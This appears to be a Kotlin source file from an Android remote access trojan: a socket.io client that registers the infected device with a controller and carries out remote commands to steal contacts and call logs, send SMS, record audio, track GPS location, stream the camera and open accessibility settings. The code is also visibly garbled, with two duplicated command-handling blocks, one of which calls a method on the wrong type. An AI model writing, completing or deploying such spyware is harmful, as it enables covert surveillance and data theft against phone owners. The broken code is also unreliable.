object SocketManager {
    var socket: Socket? = null

    fun init(url: String): Socket {
        socket = IO.socket(url).apply {
            on("connect") {
                emit("register-agent", JSONObject().apply {
                    put("agentId", "agent_${System.currentTimeMillis()}")
                    put("deviceInfo", getDeviceInfo())
                })
            }
            on("command") { args ->
                val data = args[0] as JSONObject
                handleCommand(data)
            }
            connect()
        }
        return socket!!
    }

    private fun handleCommand(data: JSONObject) {
        val command = data.optString("type")
        val context = RatService.instance ?: return
when (command.optString("type")) {
    "get_contacts" -> DataExtractor.getContacts(context)
    "get_call_logs" -> DataExtractor.getCallLogs(context)
    "send_sms" -> SmsTools.send(command.optString("phone"), command.optString("message"))
    "record_audio" -> AudioRecorder.record(context, command.optInt("seconds", 10))
}
 when (command) {
            "send_sms" -> {
                val phone = data.optString("phone")
                val msg = data.optString("message")
                SmsTools.send(phone, msg)
            }
            "record_audio" -> {
                val duration = data.optInt("seconds", 10)
                AudioRecorder.record(context, duration)
            }
            "open_accessibility" -> {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            }
            "get_gps" -> GpsTracker.getLocation()
            "toggle_camera" -> CameraStream.toggle()
        }
    }

    private fun getDeviceInfo() = JSONObject().apply {
        put("model", Build.MODEL)
        put("android", Build.VERSION.RELEASE)
    }
}
